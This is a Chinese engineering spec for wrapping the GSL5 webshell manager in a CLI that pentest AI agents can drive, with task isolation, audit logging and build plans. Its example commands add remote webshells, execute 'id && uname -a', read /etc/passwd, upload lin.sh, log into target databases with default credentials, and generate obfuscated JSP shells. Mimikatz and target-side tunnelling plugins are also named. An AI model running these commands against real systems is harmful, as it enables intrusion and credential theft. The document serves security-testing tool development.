# GSL5 CLI 化改造实施方案（v2 · 源码核实版）

> 定位：本文是 [CLI化改造方案.md](CLI化改造方案.md)（决策版 v1）的**落地实施规格**。决策基线不变：放弃 MCP 作为 agent 接入方式、CLI 收敛为单一能力源、CLI 词汇直接采用 GSL5 原生工具名、task 隔离解决多任务并发。
> **术语修订（本版）**：v1 的 `project` 概念统一更名为 **task**；`--task` 为**可选参数**，缺省使用内置默认 task **`default`**（临时操作、人工调试与未显式分派的工作统一落 default）。
> 本文对 v1 的全部前提按当前源码（`main` @ 3.1.8，commit 87df526）**逐条实测核实**，修正了 3 处偏差，补齐 7 项实施级事实，并给出可直接执行的代码改动、构建门与验收命令。
> 前置论证见 [MCP-改造分析-stdio与CLI.md](MCP-改造分析-stdio与CLI.md)。

---

## 0. 决策基线（继承 v1，不再论证）

1. **不做** stdio MCP / `GSL5_MCP_TOOLS` 白名单 / Streamable HTTP 升级；McpService 的 SSE 服务代码原样保留（人工 Claude 调试旁路），不投入新开发。
2. CLI 两层：**L1 `call <tool> --json` 透传**（50 内置 + 插件工具 100% 可达）+ **L2 语义子命令**（高频命令的 flag 糖衣）。
3. CLI 命令名 = MCP 工具名，参数名 = 工具参数名，**零翻译层**；消费侧（deepstrike/mirrorstrike）负责旧词汇迁移。
4. **一个任务（engagement/session）= 一个 task = 一个唯一 data.db**；`--task` 可选、缺省 `default`；wrapper chdir 是 task 语义的执行点。
5. 输出契约：stdout 恰好一行 JSON；日志全部 stderr；退出码 0/2/3/4/5。

---

## 1. 源码核实结果（当前树实测）

### 1.1 v1 前提（C1–C8）核实表

| # | v1 前提 | 实测结果 |
|---|---|---|
| C1 | `Db` 硬编码 `jdbc:sqlite:data.db` | ✅ 成立：`Db.java:32`（常量）与 `Db.java:660`（static 块内直连）。**补充**：连库发生在 **static 初始化器**（`static { … }`，:658 起），类加载即建库建表——chdir 必须发生在 JVM 启动前（wrapper），Java 侧无补救窗口 |
| C2 | CWD 相对资源：`data.db`、`GodzillaCache/<shellId>`、`profile/` | ✅ 成立：`Db.java:240`（GodzillaCache）、`ApplicationContext.java:2710/2822/2954` 等（profile） |
| C3 | `McpService(boolean skipUi)` 无 Swing；dispatch/toolsCall private 同类可调 | ✅ 成立：`:98` 构造器、`:1181 dispatch`、`:1397 toolsList`、`:1474 toolsCall`。**补充**：`McpService implements Plugin`（:59），**不是 Swing 容器**，仅 `!skipUi` 时才创建 JPanel——headless 复用比 v1 预估更安全 |
| C4 | 审计进程内 ArrayDeque，绑定 sessionId 才落库 | ✅ 成立且已查清全链：`OperationAuditLog.appendBlock`（:73）在 `OperationLogStore.isAvailable() && boundSessionId != null` 时直接写库；但 `OperationLogRuntime.bootstrap()`（init+建会话+绑定）**仅被 `MainActivity.java:242` 调用**——headless/MCP 模式下审计从不落库。CLI 必须自行 bootstrap（§4.2） |
| C5 | 无 lib/、bin/；无 jar；JDK 可用 | ✅ 成立：`lib/` `bin/` 不存在（README :109 明示不随仓库分发）；本机 JDK 8（默认）/11/21/25 可用。S0 构建门维持 |
| C6 | 旧 jar 词汇 8 个、输出契约 `{ok,…}` | ✅（消费侧事实，`/opt/deepstrike/packages/webshell/cli.ts` 存在且为 godzilla-cli 包装，本仓库无涉） |
| C7 | 源码默认 GBK，McpService UTF-8 | ⚠️ **部分修正**：`McpService.java`、`Gsl5Main.java`、`ApplicationContext.java`、`Db.java` 均为 UTF-8/ASCII（**本方案触碰的 4 个既有文件全都不是 GBK**，可正常编辑）；GBK 文件存在于 `shells/plugins/java/`（如 `ClassLoader.java`、`OaTools.java`，grep 按二进制拒读）与 core 多数 UI 文件。纪律修订为：**触碰这 4 个文件正常编辑但保持改动内无中文（或确认 UTF-8 落盘）；其余 GBK 文件本方案不触碰** |
| C8 | mirrorstrike skill 范式 | ✅ 成立（`/opt/mirrorstrike/skills/pentest-godzilla` 在位，消费侧 D3 适用） |

### 1.2 新增实施级事实（F1–F7，直接决定实现方式）

| # | 事实（源码定位） | 对实现的约束 |
|---|---|---|
| F1 | `toolsList()` 是**手拼 JSON 字符串**（`:1397-1472`），参数"必填"藏在中文描述文本（`s("必填")`）里，**无结构化 required**；仅插件工具的 `@McpParam` 有 `required` 字段 | L2 命令表**不能**运行时靠解析 toolsList 驱动——采用**硬编码表驱动**（命令名/参数/必填/别名显式声明），toolsList 只做**只读消费**：`doctor` 覆盖率校验 + `tools` 目录命令展示（名称级正则提取），不进参数解析路径 |
| F2 | 代码库**没有 JSON 解析器**：`MessageHandler` 用 SnakeYAML `yaml.load` 解析请求体；`j()/m()/t()/p()` 只是序列化辅助 | CliMain 自带 **~120 行递归下降 JSON 解析器**（解析 `--json` 透传参数、toolsCall 响应、tools/list 名称枚举），零新依赖，且避免 SnakeYAML 标量歧义 |
| F3 | `toolsCall` 的 **default 分支即 `callPluginTool(name, a)`**（:1532） | 插件工具（`@McpTool`：scan/useradd/mimikatz/TH_TOOLS 等 ~10 个）经 L1/L2 **天然可达，无需 `plugin_call` 特殊语法**（修正 v1 §3.3 示例）——`gsl5 scan --shellId 3` 即可 |
| F4 | 失败语义：`toolsCall` catch-all 把异常写进 `content[0].text`（前缀 `执行失败: `，:1534-1536）；`callPluginTool` 未知工具回 `未知工具: `、缺参回 `缺少必填参数: `；dispatch 级错误才有 jsonrpc `error` 字段 | 退出码 3 的判定 = 响应含 `error` 字段 **或** text 命中失败前缀集 `{执行失败, 未知工具, 缺少必填参数, 未找到 Shell}`；L2 表内命令的必填校验在 CLI 侧前置完成（exit 2），不依赖远端报错 |
| F5 | 审计接线点：`OperationLogRuntime.bootstrap(panel)` 以 `panel==null` 调用即完成 init+建会话+绑定（内部对 panel 判空）；`notifyChunk` 无监听器时为 no-op | CLI 审计 = 启动时 `OperationLogRuntime.bootstrap(null)` 一行 + 每命令 `OperationAuditLog.ui("cli", tool, argsLine)` 显式落账（~5 行），数据目录经 F6 的 `-D` 随 task 内聚 |
| F6 | `OperationLogStore.java:28`：`new File(System.getProperty("user.home"), ".gsl5")` 硬编码 | 加 `-Dgsl5.data.dir` 支持（~2 行），wrapper 传 `<task>/logs`，审计库随 task 走 |
| F7 | `Gsl5Main.java:14` 已有 `"mcp"` 分派 + :21 headless 自动 fallback MCP；`MANIFEST.MF` Main-Class=core.Gsl5Main | `"cli"` 分支插在 :14 的 mcp 分支旁（同文件 UTF-8 可正常编辑）；CLI 分支必须**先于** headless fallback 判断，避免无显示环境下误入 MCP |
| F8 | **代理链路**：`ShellEntity` 持久字段 `proxyType/proxyHost/proxyPort`（DB 列已有）→ `HttpRequestChannel:22` 构造时 `ProxyT.getProxy(ctx)` → OkHttp `clientBuilder.proxy()`（:117）/ `URL.openConnection(proxy)`（:67）；C2 通道按 profile proxyList 随机轮选、回落 ProxyT；`shell_add/shell_edit` 实现均处理三参数（:1964-1966/:1987-1989，edit 后清会话缓存）；`gsl5://` 链接 24 项配置含代理。**但 `core/ProxyT.java` 在 src 与 git 全部历史中均不存在**（穷尽搜索核实） | CLI 复用实现层即支持 HTTP/SOCKS 代理（per-shell），零新增业务代码；但 S0 源码构建会在 `shells/channel` 编译处失败——S0 必须补 `ProxyT`（依赖第 4 档，§5.1）；代理类型的准确取值字符串由缺失的 `ProxyT.getAllProxyType()` 定义，需从 Release jar 确认 |

---

## 2. CLI 设计规格（实施版）

### 2.1 启动语法

```bash
gsl5 [全局选项] <command> [命令参数...]
# 等价 java -jar gsl5.jar cli [全局选项] <command> ...（wrapper 见 §4.3）

全局选项（全部可选）：
  [--task NAME]           task 名，缺省 "default"（解析优先级 --task > $GSL5_TASK > "default"）
  [--tasks-root DIR]      task 根目录（--tasks-root > $GSL5_TASKS_ROOT > <cwd>/tasks）
  [--format json|text]    默认 json
  [--timeout SECONDS]     单命令超时，默认 120（CLI 侧 watcher 线程，超时输出 exitCode=4 信封）
  [--no-color]            text 模式禁用着色
```

**默认 task 语义**：`--task` 省略（且未设 `GSL5_TASK`）时使用 `default`——即 `gsl5 shell_list` 等价于 `gsl5 --task default shell_list`。default task 目录（`<tasks-root>/default/`）**无需预创建**：wrapper `mkdir -p` 幂等，首次使用即建。default 面向临时操作、人工调试与未显式分派的工作；正式任务与多 agent 协作**显式命名 task**（§7 D3/D4 的映射约定不变）。

### 2.2 输出契约

- stdout 恰好一行 JSON：
  - 成功：`{"ok":true,"task":"taskA","tool":"shell_exec","text":"<content[0].text 原文>"}`；**若 text 本身是 JSON 对象则内联展开**（`file_list`/`shell_list` 等结构化工具直接给字段），尽力而为、失败回退 text 字段。
  - 失败：`{"ok":false,"task":"taskA","tool":"...","error":"...","hint":"..."}`
- 信封含 `task` 字段（实际生效的 task 名，含缺省展开后的 `default`），便于多任务并行时人工/agent 核对落点。
- 日志一律 stderr（`[gsl5]` 前缀）；**stdout 纯净化用 FileDescriptor 手法**（§4.1），深层代码的杂散 `System.out.println` 全部落 stderr。
- 退出码：`0` 成功 / `2` 用法错误（未知命令、缺必填 flag、JSON 解析失败）/ `3` 目标连接或执行失败 / `4` 超时 / `5` task 写锁竞争超限。
- 大文件纪律：`file_read --out <本地路径>` 直存、`file_upload_local --file <本地>` 直传（对应工具参数 `localPath`，服务端分片不经上下文）；`--json` 内嵌 base64 仅限小内容。

### 2.3 命令词汇

**L2 命令表（首版 ~25 个高频，硬编码表驱动；全部参数 = 工具 schema 参数名）**：

```bash
# 两种形态：显式 task（正式任务/多 agent 协作）与缺省 task（临时/人工调试）
gsl5 shell_list                                    # 省略 --task → 落 default
gsl5 --task taskA shell_list [--group G]           # 显式 task
# Shell 面
gsl5 --task taskA shell_add --url http://t/shell.jsp --password pass --secretKey key \
     --payload JavaDynamicPayload --cryption JAVA_AES_BASE64 [--encoding UTF-8] [--remark R] \
     [--proxyType HTTP --proxyHost 127.0.0.1 --proxyPort 8080]     # 出口代理，省缺直连（§4.7）
gsl5 --task taskA shell_get --shellId 3 | shell_delete --shellId 3 | shell_info --shellId 3
gsl5 --task taskA shell_exec --shellId 3 --command 'id && uname -a' [--encoding auto]
gsl5 --task taskA shell_batch_test [--group G]     # 批量操作合并进单次调用，摊薄冷启动
gsl5 --task taskA shell_export --shellId 3 | shell_import --link 'gsl5://...'
# 文件面（--out/--file 为唯一别名，映射 localPath）
gsl5 --task taskA file_list --shellId 3 [--path /var/www]
gsl5 --task taskA file_read --shellId 3 --path /etc/passwd --out ./passwd.txt
gsl5 --task taskA file_upload_local --shellId 3 --file ./lin.sh --remotePath /tmp/lin.sh
gsl5 --task taskA file_delete|file_mkdir --shellId 3 --path P
# 数据库面
gsl5 --task taskA db_connect --shellId 3 --target '127.0.0.1 1433 sa 123456 sqlserver' [--configName C]
gsl5 --task taskA db_exec --shellId 3 --sql 'select @@version' [--execType select]
# 生成面
gsl5 --task taskA shell_create --cryption aesbase64 --genFile ./shell.jsp \
     [--obfuscation superUnicode] [--payload JavaDynamicPayload]   # C2 类型自动选模板
# 审计与元命令（不属于工具面）
gsl5 --task taskA call <tool-name> --json '{"shellId":"3",...}'    # L1 透传兜底（含全部插件工具）
gsl5 tools [keyword] | tools <tool-name>      # 全量工具目录 / 单工具参数 schema（§2.4）
gsl5 task list | path                         # task 管理（list 含 default）
gsl5 version | doctor                         # 自检（§4.6）
gsl5 --help | help <command>                  # L2 命令清单 / 单命令参数表（§2.4）
```

**未进表的 ~35 个工具**（file_copy/move/attr/search、db_databases/tables/preview/count、c2profile_*、settings_*、config_*、process_list、net_info、shell_clone/edit/env/test/detect_encoding/backup/search/count、mcp_*、oplog_query 及全部插件工具）经 `call` 透传 100% **可达**；其**可发现性**由 §2.4 的 `tools` 目录命令承载；后续按调用频度提升进 L2 表，只是加表项，无逻辑改动。

### 2.4 帮助与工具发现（help 分层 + tools 目录 + skill 分层）

`call` 透传解决"调得到"，还需解决"查得到"与"何时用"——三层各司其职：

| 层 | 命令/载体 | 内容 | 数据源（零漂移原则） |
|---|---|---|---|
| **help（快速面）** | `gsl5 --help`；`gsl5 help <command>` | 全局选项 + L2 命令清单（一行一个，~25 条）+ 元命令提示；单命令给参数/必填/别名表 | CliMain 内置 CommandSpec 表**直接生成**——表驱动即文档，无第二份描述 |
| **tools（发现面）** | `gsl5 tools [--json] [keyword]`；`gsl5 tools <tool-name>` | 全量 ~60 工具目录（名称/中文描述/参数 schema），支持关键词过滤；`--json` 供 agent 机读；单工具模式给参数级 schema | seam `cliToolsListRaw()` 实时读 `toolsList()`——**上游新增/改名工具目录自动跟上，文档零维护**。与 F1 不冲突：F1 禁止的是 L2 参数解析依赖 toolsList，此处是只读展示 |
| **skill（编排面）** | cli/SKILL.md + 三宿主模板 | L2 高频命令详解 + task/退出码/大文件/代理纪律 + **长尾范式一句话**（"先 `gsl5 tools [关键词]` 查目录，再 `call <name> --json` 调用"）+ 精选索引（提权插件/`shell_create` 混淆与 C2/达梦金仓等点 ~5-8 个名） | **skill 不复制参数级文档**——参数靠 `tools <name>` 实时自省；复制两份必然与上游漂移 |

> help 刻意**不放** 60 工具全量：全量平铺稀释路由准确率（分析文档 §6 结论）；60 工具目录按需经 `tools` 获取（一次 ~10-14KB，非常驻上下文）。

---

## 3. 交付物 D1：本仓库代码改动清单

| 文件 | 改动 | 规模 |
|---|---|---|
| `src/shells/plugins/generic/CliMain.java`（**新文件**，UTF-8） | CLI 全部逻辑：全局选项解析（`--task` 可选 + default 展开）、迷你 JSON 解析器、L2 命令表、L1 透传、stdout 纯净、审计落账、超时 watcher、doctor、退出码 | ~550 行 |
| `src/shells/plugins/generic/McpService.java`（类末尾追加） | 2 个 seam：`cliCall(name,args)`（包 `toolsCall`）+ `cliToolsListRaw()`（包 `toolsList`，doctor 与 `tools` 目录命令共用） | ~6 行 |
| `src/core/Gsl5Main.java` | +`"cli"` 分支（置于 mcp 分支旁、headless fallback 之前），`System.exit(CliMain.run(rest))` | ~6 行 |
| `src/core/Db.java` | static 块 `:660` 连库后追加 WAL + busy_timeout + synchronous | ~6 行 |
| `src/core/persist/OperationLogStore.java` | 数据目录支持 `-Dgsl5.data.dir`（默认 `~/.gsl5` 不变） | ~2 行 |
| `cli/` 目录（**新**）：`gsl5` wrapper、`SKILL.md` 手册、`build-cli.sh`、`tests/compat-golden.sh` | 运维与文档资产随 fork 版本化 | ~400 行 |

对既有文件的 in-place diff 收敛为 **~20 行 / 4 文件**，且全部是追加式单点插入（fork 合并冲突面≈0，见 §8）。

### 3.1 Gsl5Main.java 分支

```java
if (args != null && args.length >= 1 && "cli".equals(args[0])) {
    System.setProperty("java.awt.headless", "true");
    String[] rest = new String[args.length - 1];
    System.arraycopy(args, 1, rest, 0, rest.length);
    System.exit(shells.plugins.generic.CliMain.run(rest));
    return;
}
```

### 3.2 McpService.java seam（类末尾，同类直访 private，不用反射）

```java
/** CLI seam: transport-free tool dispatch. Returns raw JSON-RPC response string. */
public String cliCall(String name, java.util.Map<String, Object> args) {
    return toolsCall(m("name", name, "arguments", args == null ? new java.util.HashMap<String,Object>() : args), 1);
}

/** CLI seam: raw tools/list JSON for doctor coverage check and the `tools` catalog command. */
public String cliToolsListRaw() { return toolsList(1); }
```

seam 失效（上游重构）时**编译期即失败**，merge 时顺手修复——优于反射的运行期暴露。

### 3.3 CliMain.java 结构分解

```text
CliMain
├── run(String[] args) : int              # 入口；返回退出码
├── stdout 纯净：捕获 FileDescriptor.out 为协议通道，System.setOut(stderr)（§4.1）
├── 选项解析：--task 缺省展开为 "default"（--task > $GSL5_TASK > "default"）
├── MiniJson：parse(String)->Object / write(Object)（~120 行，F2）
├── CommandSpec 表：name → {params[{name,required,alias,integer}], handler}
│     ├── L2 25 命令：flag 解析 → params Map → callTool(name, params)
│     ├── help：--help / help <command> 由 CommandSpec 表直接生成（§2.4）
│     └── 元命令：call / tools / task / version / doctor
├── callTool(name, params) :
│     ├── OperationAuditLog.ui("cli", name, argsLine)        # F5 落账
│     ├── resp = svc.cliCall(name, params)                    # seam
│     ├── 解析 resp：error 字段 / 失败前缀集 → exit 3 信封（F4）
│     └── 成功 → text 尽力内联 JSON → 单行信封（含 task 字段）→ return 0
├── TimeoutWatcher：--timeout 秒后输出 exitCode=4 信封并 halt
└── bootstrap：OperationLogRuntime.bootstrap(null)（F5）
```

要点：`new McpService(true)`（skipUi）创建一次、顺序执行 N 条命令（同进程多命令模式 `gsl5 cli-batch file.json` 为可选项，留 v2 再议）；整数型参数（connTimeout/readTimeout/proxyPort）按命令表声明转 `Integer`，与 `i()` schema 对齐。CliMain 自身不做 chdir（Java 无 chdir）——task 落点由 wrapper 保证（§4.3），CliMain 仅在信封回显实际 task 名。

### 3.4 Db.java pragma（并发治理 L1 层）

static 块 `dbConn = DriverManager.getConnection(...)`（:660）之后插入：

```java
try (java.sql.Statement st = dbConn.createStatement()) {
    st.execute("PRAGMA journal_mode=WAL");
    st.execute("PRAGMA busy_timeout=5000");
    st.execute("PRAGMA synchronous=NORMAL");
} catch (Exception e) { Log.error(e); }
```

L2 应用层（task 写锁）/ L3 长操作不加锁 / L4 NFS 禁入：按 v1 §3.6 分层执行，wrapper 与 CliMain 分担（§4.3、§4.4）。

### 3.5 OperationLogStore.java

```java
File dir = new File(System.getProperty("gsl5.data.dir",
    new File(System.getProperty("user.home"), ".gsl5").getPath()));
```

---

## 4. 关键实现细节

### 4.1 stdout 纯净化（stdio/CLI 共用的第一纪律）

```java
// CliMain.run 最先执行：
PrintStream proto = new PrintStream(new FileOutputStream(FileDescriptor.out), true, "UTF-8");
System.setOut(new PrintStream(new FileOutputStream(FileDescriptor.err), true, "UTF-8"));
// 此后任何深层 System.out.println 落 stderr；最终信封只用 proto 输出一行并 flush
```

UTF-8 显式编解码（stdin 读入同理），杜绝平台默认编码污染——这是 mcp 模式 `System.out` 横幅问题的根治手法。

### 4.2 审计接线（F5）

`OperationLogRuntime.bootstrap(null)`（init store + createSession + bindSessionForPersistence）→ 每条命令前 `OperationAuditLog.ui("cli", toolName, oneLine(args))`。`appendBlock` 检测到 store 可用且已绑定即直接落库（`OperationAuditLog.java:73-80` 实测）。数据目录由 wrapper `-Dgsl5.data.dir=<task>/logs` 指到 task 内（default task 即 `default/logs`），审计随任务边界生命周期化。`doctor` 输出审计可用性。

### 4.3 task 隔离（wrapper chdir 主机制；v1 §3.5 的 project 更名 task，机制不变）

```bash
#!/bin/bash
# cli/gsl5 —— 真实入口；task 语义 = chdir
JAR="$(dirname "$(readlink -f "$0")")/gsl5.jar"
ROOT="${GSL5_TASKS_ROOT:-$PWD/tasks}"
# …解析 --task / --tasks-root 并从 ARGS 中 slice 掉；TASK 未指定时取 "default"…
TASK_DIR="$ROOT/$TASK"
mkdir -p "$TASK_DIR/GodzillaCache" "$TASK_DIR/logs"      # 幂等：default 首用即建
cd "$TASK_DIR" || exit 2
# 唯一性守卫：realpath 校验拒绝符号链接 data.db / task 名碰撞；NFS/UNC 检测（stat -f）拒绝网络 fs
[ -e profile ] || ln -s "$(realpath --relative-to="$TASK_DIR" "$ROOT/shared/profile")" profile
exec java ${GSL5_JAVA_OPTS:--Djava.awt.headless=true} -Dgsl5.data.dir="$TASK_DIR/logs" \
     -jar "$JAR" cli "${ARGS[@]}"
```

**task 目录布局**：

```text
<tasks-root>/
├── shared/profile/            # 全局模板资产（各 task 符号链接共享，非 DB）
├── default/                   # 默认 task：--task 省略时落这里，首用即建
│   ├── data.db                # 本 task 唯一 DB：shell/分组/设置/插件登记
│   ├── GodzillaCache/<shellId>/
│   ├── logs/                  # 含 operation_audit.db（-Dgsl5.data.dir 指入）
│   └── profile -> ../shared/profile
└── <task>/                    # 显式命名任务：结构与 default 完全一致
```

硬约束与跨 task 协作同 v1 §3.5：**一 task 一 DB，DB 不跨 task 共享**（唯一性守卫 + 审计库随 task 内聚 + 跨 task 只走 `shell_export`/`shell_import` 显式通道）；`default` 与命名 task 之间同样不共享 DB。

### 4.4 并发治理落点

L1 pragma（§3.4）在 Java；L2 task 写锁在 CliMain（`FileChannel.lock` 于 `<task>/.write.lock`，仅快速写命令：shell_add/edit/delete/clone/import、settings_set、task 管理；等待上限 10s，超时 exit 5）；L4 网络文件系统检测在 wrapper（`stat -f -c %T`，命中 nfs/cifs/smb 即拒绝，exit 2）。

### 4.5 超时

`--timeout` 默认 120s：watcher 线程到点向 proto 写 `{"ok":false,"tool":…,"error":"timeout","exitCode":4}` 并 `Runtime.halt(4)`（网络连接无法优雅中断；halt 前审计行已落库）。长任务（Mimikatz/大文件）在调用方放宽 `--timeout`。

### 4.6 doctor 检查项

JDK 版本 ≥ 8；jar 完整性（`version` 与 `ApplicationContext.RELEASE_TAG` 一致）；当前 task 的 DB 存在且非符号链接、task 名 realpath 无碰撞（含 `default`）；文件系统非 NFS/UNC；审计 store 可用性（bootstrap 结果）；**工具覆盖率**：`cliToolsListRaw()` 正则提取 `"name":"…"` 全集 ⊆ L2 表 ∪ `call` 可达（透传对任意名字都尝试，故校验语义为"L2 表内命令名必须在 tools/list 中存在"——防上游改名后 L2 静默失效）；token/profile 目录状态。

### 4.7 代理支持（F8 核实结论）

**支持 HTTP/SOCKS 代理，CLI 零新增业务代码**。代理是 Shell 的持久属性（`proxyType/proxyHost/proxyPort`），在 HTTP 通道层统一生效——`shell_exec`/`file_*`/`db_*`/批量测试等全部工具流量均经 `HttpRequestChannel`/`C2ProfileHttpRequestChannel` 出口，自动携带所属 Shell 的代理配置：

- `shell_add --proxyType --proxyHost --proxyPort`（省缺直连）；`shell_edit` 同三参数，且改后自动清会话缓存、立即生效（:1987-1998 实测）；
- `shell_import` 的 `gsl5://` 链接 24 项配置含代理（README :328），跨 agent/跨 task 迁移不丢；
- C2 壳可在 c2profile 配置 proxyList 按请求随机轮选（流量伪装面，独立于 per-shell 代理，`C2ProfileHttpRequestChannel:260-268`）。

**注意事项**：
1. 代理类型取值以 `ProxyT.getAllProxyType()` 为准——源码缺失（F8），准确字符串（HTTP/SOCKS 等大小写与中文项）须从 Release jar 反编译确认后写入 skill/L2 表校验；
2. **环境变量 `http_proxy`/JVM 系统属性代理不构成受支持的兜底**：通道显式传 `Proxy` 对象，`ProxyT` 未配置时返回 null 还是 `NO_PROXY` 源码不可见——唯一可靠路径是 per-shell 配置；CLI 不设全局代理选项；
3. `shell_edit` 的 toolsList schema 描述漏列 `proxyPort`（实现已支持，:1989）——L2 表按**实现**补全 `--proxyPort`，佐证"表驱动以实现为准、doctor 仅做名称级校验"的设计（F1）；
4. `NHttpProxy`/`NEasySocksProxy` 是**目标机侧**的内网穿透代理插件（在目标上开 socks/http 供本机入连），与本题"本机出口代理"是两回事，能力面上并存不混淆。

---

## 5. 构建门（S0）与测试

### 5.1 S0 全量构建（唯一外部依赖门，1–1.5 天）

按 README「编译与构建」三段 javac（GBK 核心段 + UTF-8 McpService 段 + 打包），依赖三档收集：

1. **Maven Central**：flatlaf 系 / guava / pecoff4j / rsyntaxtextarea / snakeyaml / okhttp3+kotlin-stdlib / asm / sqlite-jdbc / postgresql / forms_rt；
2. **自定义二进制从旧 godzilla-cli.jar 定向提取**（`com.httpProxy`、flatlaf 全家桶、pecoff4j、intellij uiDesigner，`unzip -n` 解包）；
3. **源码内自编译资产**：`dm.jar`/`kingbase.jar`/`asm.jar`/`*.classs` 由 assets 构建产出；
4. **缺失源码补档（F8）**：`core/ProxyT.java` 不在 src——从 Release jar 反编译重建 `ProxyT.java`（API 面：`public static Proxy getProxy(ShellEntity)` / `public static String[] getAllProxyType()`）随 fork 版本化，或提取 `core/ProxyT.class` 直接入编译期 classpath。**不补则 `src/shells/channel/*` 编译失败**。

逐 jar `jar tf` 校验缺类即 fail-fast。**验收**：`java -jar gsl5.jar cli version` 输出 JSON；与 Release jar 对照 tools/list 名称集一致；`mcp` 模式可启动（回归不破）。

### 5.2 cli/build-cli.sh 与 cli/tests/compat-golden.sh

- `build-cli.sh`：三段编译 + 打 jar + `jar uf` 单类快速通道（开发期迭代 CliMain 不重打包）+ 编码断言（触碰的 4 文件无 GBK 回归）。
- `compat-golden.sh`：S2 一致性回归 = ① tools/list 名称集 vs L2 表（doctor 同源逻辑）；② `call X --json` 与 L2 flag 两条入参路径对同工具输出等价；③ 固定 golden 样例（shell_list 空库/含库、file_read 文本/二进制/大文件、db_exec select/update）信封快照；④ **task 解析矩阵**：缺省 → `default`、`--task X` → X、`GSL5_TASK=Y` + 无 flag → Y、flag 覆盖 env。

---

## 6. 实施阶段与验收（修订自 v1 §6）

| 阶段 | 内容 | 验收（可执行命令级） | 估时 |
|---|---|---|---|
| S0 全量构建 | §5.1 依赖三档 + 三段 javac | `cli version` 出 JSON；tools/list 名称集与 Release jar 一致；`mcp` 模式回归可启 | 1–1.5 天 |
| S1 CLI 核心 + task 隔离 | CliMain 透传 + wrapper chdir + Db pragma + 审计绑定 | ① stdout 单行 JSON 纯净（`gsl5 shell_list 2>/dev/null \| python3 -m json.tool` 通过）；② 两进程并发 `shell_add`+写设置 50 轮零 BUSY；③ `--task a/b` 的 data.db 互不可见，且与 `default` 三者互不可见；④ 退出码矩阵 0/2/3/4/5 逐项触发；⑤ `sqlite3 <task>/logs/operation_audit.db` 可查到 cli 落账；⑥ 缺省 `--task` 首用即在 `<tasks-root>/default` 建目录且信封 `task:"default"` | 1 天 |
| S2 语义对齐 | compat-golden 全量枚举 + 双路径等价 + task 解析矩阵 | golden 快照过；真实 tomcat9 + JAVA_AES_BASE64 冒烟 `shell_add`/`shell_exec`/`file_read` | 0.5–1 天 |
| S3 手册 + 通用 skill | cli/SKILL.md + 三宿主模板（dsh/pi/Claude Code） | 三处目录条目可见、可加载 | 0.5 天 |
| S4 mirrorstrike 切换 | `pentest-godzilla` → `pentest-gsl5`（整替） | 真实演练全链路走通；双 agent 同 task 复用验证 | 0.5 天 |
| S5 deepstrike 切换 | `Gsl5Cli` 替换 `GodzillaCli` + config + tests | `pnpm test` 全绿；web 全功能冒烟 | 0.5–1 天 |
| S6 收尾 | 旧 jar 归档、README/AGENTS 更新 | 文档齐；一个观察期后下线旧集成 | 0.5 天 |

合计 ≈ 3.5–5 天（S0 为唯一外部依赖门）。

## 7. 消费侧改造精要（D2/D3/D4，本机路径已核实）

- **D2 通用 skill**：`cli/SKILL.md` 为权威手册（词汇/task/退出码/大文件纪律/审计），三宿主模板按 frontmatter 差异微调；skill 正文不写凭据、不复制手册（引用 `{BASE}/SKILL.md`）、**不复制参数级文档**——L2 高频命令详解 + 长尾"先 `gsl5 tools [关键词]` 查目录再 `call`"范式 + 精选索引，按 §2.4 三层分工（help=快速面 / tools=发现面 / skill=编排面）。
- **D3 mirrorstrike**：`/opt/mirrorstrike/skills/pentest-godzilla` → `pentest-gsl5` 整替；`--tasks-root <任务工作区>/tmp/state/gsl5-tasks --task main`（task 显式命名，保证同任务多 agent 共享同 task、跨任务天然隔离；省略则落 `default`，正式演练不推荐）；词汇按 §2.3 重写；保留编排协议段落，新增退出码/锁竞争重试条款。
- **D4 deepstrike**：`/opt/deepstrike/packages/webshell/cli.ts` 的 `GodzillaCli` → `Gsl5Cli`（wrapper 路径 + `--task <sessionName>`（每个 webshell 会话一个 task，engagement 级隔离）+ 方法级词汇映射 `commandExec→shell_exec` 等）；**删除 `isWrapperCompatible`**（md5 前导零校验为旧包装器特有缺陷，GSL5 完整协议不存在；以 `shell_info` 探活替代，实测回归后处理）；v1 Kit 工具签名不动，`pnpm test` 锁定奇偶。

## 8. Fork / git 操作（按当前仓库状态落地）

当前状态：`main` @ 3.1.8（87df526），`origin` 指向上游，`docs/` 未跟踪，fork 未创建。执行序列：

```bash
# ① 网页 fork Xaaaa-bip/GodzillaSuper → <you>/GodzillaSuper，然后：
git remote rename origin upstream && git remote add origin <you>/GodzillaSuper.git
git fetch upstream --tags
git checkout -b cli 3.1.8 && git push -u origin cli     # 分叉点 = 实际运行 release
# ② 本方案改动全部落在 cli 分支；原子提交：cli-core / db-pragma / audit-dir / wrapper+docs 分开
git tag 3.1.8+cli.1 && git push origin cli --tags        # tag 规范 <上游版本>+cli.<序号>
# ③ 上游合并（每个上游 release 一轮）：
git fetch upstream --tags && git checkout cli && git merge upstream/main
./cli/build-cli.sh && ./cli/tests/compat-golden.sh       # 合并安全网
git tag 3.1.9+cli.1
```

冲突预期面仅 4 处单点插入（Gsl5Main 分支 / McpService 类末尾 seam / Db static 块 / OperationLogStore 一行），均为追加式。终局建议推回上游（`dev` 分支 PR），合入后 fork diff→0。

## 9. 风险与对策（增量于 v1 §7）

| 风险 | 对策 |
|---|---|
| 无 JSON 解析器导致透传参数解析踩坑（F2） | CliMain 内置 MiniJson 并做 round-trip 单测；拒绝 SnakeYAML 路径（标量歧义面） |
| 失败前缀集漏判（上游新增失败文案，F4） | golden 测试锁定现役文案；seam 返回结构化的改造留 v2（届时 toolsCall 增加结构化错误通道，CLI 优先读结构化） |
| Db static 块在 chdir 前触库（C1 补充） | 纪律：Gsl5Main/CliMain 在首次触 Db 前不做任何业务初始化；wrapper chdir 先于 exec java；doctor 复检 DB 位置 |
| default task 被误用作正式任务仓库（`--task` 可选化的代价） | skill 与适配器固化映射约定：正式任务/agent 会话必须显式 `--task`；default 仅作临时与人工调试落点；doctor 输出 default task 的 shell 计数提示体量 |
| 审计 bootstrap 触碰 UI 类（`OperationLogPanel` import） | 实测 bootstrap(panel==null) 路径与 mcp 模式同类加载先例，均不实例化 Swing 组件；S1 验收含 headless 冒烟 |
| `--timeout` 与服务端长连接无法优雅中断 | watcher + `Runtime.halt`；skill 写明长任务放宽超时；审计先行落账保证可回溯 |
| S0 构建失败（依赖收集不全） | 改动收敛为 patch 文件交付路径（v1 §7）；build-cli.sh 逐 jar fail-fast |
